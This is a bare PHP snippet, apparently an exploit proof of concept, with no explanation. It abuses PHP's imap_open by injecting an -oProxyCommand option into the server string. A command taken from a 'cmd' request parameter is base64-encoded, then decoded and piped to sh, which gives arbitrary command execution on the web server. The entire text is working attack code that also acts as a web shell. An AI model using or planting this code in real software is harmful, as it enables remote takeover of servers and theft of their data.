$server = "x -oProxyCommand=echo\t".base64_encode(get("cmd"))."|base64\t-d|sh}";

imap_open('{'.$server.':143/imap}INBOX', '', '') or print("\n\nError: ".imap_last_error());